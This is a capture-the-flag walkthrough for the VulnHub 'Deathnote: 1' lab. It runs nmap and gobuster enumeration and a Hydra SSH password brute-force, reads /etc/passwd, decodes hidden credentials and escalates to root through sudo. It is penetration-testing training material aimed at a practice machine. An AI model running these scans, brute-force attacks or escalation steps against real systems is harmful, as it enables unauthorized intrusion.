# Deathnote: 1

- **Machine:** Deathnote: 1
- **Download:** https://www.vulnhub.com/entry/deathnote-1,739/

![](849-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](849-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.238
```

![](849-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.238
```

```bash
nmap -sC -sV -A 192.168.2.238
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.238
```

![](849-4.png)

---

# Web Enumeration

## Configure the Hosts File

Add the target hostname to the local hosts file.

```bash
nano /etc/hosts
```

![](849-5.png)

---

## Visit the Website

Browse the following URLs:

- http://deathnote.vuln/wordpress/
- http://deathnote.vuln/robots.txt
- http://deathnote.vuln/wordpress/wp-login.php

---

## Explore the WordPress Site

Visit:

- http://deathnote.vuln/wordpress/

![](849-6.png)

### Credentials Discovered

```text
Username : kira
Password : iamjustic3
```

---

## WordPress Login

Login using the discovered credentials.

- http://deathnote.vuln/wordpress/wp-login.php

![](849-7.png)

Successful login redirects to the WordPress dashboard.

- http://deathnote.vuln/wordpress/wp-admin/

![](849-8.png)

---

## Directory Enumeration

Perform directory brute-forcing against the WordPress installation.

```bash
gobuster dir -u http://deathnote.vuln/wordpress/ -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
```

![](849-9.png)

---

## Enumerate wp-content

Continue directory enumeration inside the `wp-content` directory.

```bash
gobuster dir -u http://deathnote.vuln/wordpress/wp-content -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
```

![](849-10.png)

---

## Browse the Uploads Directory

Visit:

- http://deathnote.vuln/wordpress/wp-content/uploads/

![](849-11.png)

Navigate into the discovered folder.

- http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/

![](849-12.png)

---

## Download the Discovered Files

```bash
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```

```bash
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
```

![](849-13.png)

---

# SSH Access

## Password Attack (Lab)

> **Lab note:** The following password attack is performed only against the authorized VulnHub practice machine.

Run Hydra using the downloaded username and password lists.

```bash
hydra -L user.txt -P notes.txt deathnote.vuln ssh
```

![](849-14.png)

### Valid Credentials

```text
Username : l
Password : death4me
```

---

## SSH Login

```bash
ssh l@deathnote.vuln
```

![](849-15.png)

---

## Read the User File

List the available files.

```bash
ls -lh
```

Display the user file.

```bash
cat user.txt
```

![](849-16.png)

---

## Decode the Brainfuck Message

Decode the contents using an online Brainfuck decoder.

- https://www.dcode.fr/brainfuck-language

![](849-17.png)

### Decoded Message

```text
i think u got the shell, but you wont be able to kill me - kira
```

---

# Privilege Escalation

## Enumerate Local Users

Review the system users.

```bash
cat /etc/passwd
```

![](849-18.png)

### Additional User Found

```text
Username : kira
```

---

## Explore the Application Directory

Navigate to the following location.

```bash
cd /opt/L
```

```bash
cd fake-notebook-rule/
```

List the available files.

```bash
ls -lh
```

![](849-19.png)

---

## Inspect the Files

Read both files.

```bash
cat case.wav
```

```bash
cat hint
```

![](849-20.png)

---

## Decode the Hidden Password

The `case.wav` file contains a hexadecimal value.

```text
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

Convert the hexadecimal value.

```bash
echo "6347467a6333646b49446f6761326c7959576c7a5a585a706243413d" | xxd -r -p
```

![](849-21.png)

Decode the resulting Base64 string.

```bash
echo "cGFzc3dkIDoga2lyYWlzZXZpbCA=" | base64 -d
```

![](849-22.png)

### Password Recovered

```text
Password : kiraisevil
```

---

## Switch to the Kira User

```bash
su kira
```

![](849-23.png)

---

## Check Sudo Privileges

```bash
sudo -l
```

---

## Obtain Root Access

```bash
sudo su
```

List the files.

```bash
ls -lh
```

![](849-24.png)

Read the root flag.

```bash
cat root.txt
```

![](849-25.png)

---

# Impact

- WordPress credentials were exposed through publicly accessible content.
- Sensitive files inside the uploads directory leaked usernames and passwords.
- Weak SSH credentials allowed authenticated access.
- Encoded hints revealed another user's password.
- Sudo privileges resulted in complete root compromise.

---

# Key Learning

- Always enumerate the WordPress uploads directory.
- Download every accessible backup or text file.
- Credentials discovered in web applications should be tested against SSH.
- Hidden hints may be encoded using Brainfuck, Hex, or Base64.
- Local enumeration is essential after gaining shell access.
- Misconfigured sudo permissions can lead directly to root access.

---

# Summary

The assessment started by enumerating a WordPress installation where valid credentials were discovered and administrative access was obtained. Directory enumeration revealed publicly accessible files containing usernames and password hints, which enabled SSH access. During post-exploitation, local enumeration uncovered encoded messages and hidden credentials that allowed switching to another user. Finally, misconfigured sudo permissions were abused to obtain root access and fully compromise the target machine.